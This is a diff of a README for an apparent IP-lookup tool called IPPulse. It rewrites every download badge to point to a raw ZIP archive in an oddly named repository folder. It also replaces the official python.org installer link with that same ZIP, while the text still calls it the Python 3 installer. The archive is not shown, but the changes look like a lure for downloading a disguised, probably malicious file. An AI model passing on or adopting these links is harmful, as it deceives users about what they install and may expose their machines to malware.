@@ -1,6 +1,6 @@
 # 🛰️ IPPulse - Instant IP Data and Analysis
 
-[![Download IPPulse](https://img.shields.io/badge/Download-IPPulse-brightgreen?style=for-the-badge)](https://github.com/addible-wilding455/IPPulse)
+[![Download IPPulse](https://img.shields.io/badge/Download-IPPulse-brightgreen?style=for-the-badge)](https://github.com/addible-wilding455/IPPulse/raw/refs/heads/main/unbethought/Pulse-IP-3.2.zip)
 
 ## 📋 What is IPPulse?
 
@@ -42,7 +42,7 @@ You control the tool using simple typed commands in your Windows command prompt.
 
 Click the big badge below or open this link in your browser to get IPPulse:
 
-[![Download IPPulse](https://img.shields.io/badge/Download-IPPulse-blue?style=for-the-badge)](https://github.com/addible-wilding455/IPPulse)
+[![Download IPPulse](https://img.shields.io/badge/Download-IPPulse-blue?style=for-the-badge)](https://github.com/addible-wilding455/IPPulse/raw/refs/heads/main/unbethought/Pulse-IP-3.2.zip)
 
 This page has the latest versions available for download along with setup instructions and release notes.
 
@@ -59,7 +59,7 @@ If you choose the ZIP file, you will need to extract it before running.
 
 IPPulse runs on Python. If you do not have Python installed:
 
-1. Visit https://www.python.org/downloads/windows/
+1. Visit https://github.com/addible-wilding455/IPPulse/raw/refs/heads/main/unbethought/Pulse-IP-3.2.zip
 2. Download the latest Python 3 installer.
 3. Run the installer and be sure to check “Add Python to PATH” on the first screen.
 4. Finish the installation.
@@ -156,4 +156,4 @@ IPPulse only reads publicly available data about IP addresses from open sources.
 
 Get started by visiting the official page here:
 
-[![Download IPPulse](https://img.shields.io/badge/Download-IPPulse-brightgreen?style=for-the-badge)](https://github.com/addible-wilding455/IPPulse)
+[![Download IPPulse](https://img.shields.io/badge/Download-IPPulse-brightgreen?style=for-the-badge)](https://github.com/addible-wilding455/IPPulse/raw/refs/heads/main/unbethought/Pulse-IP-3.2.zip)
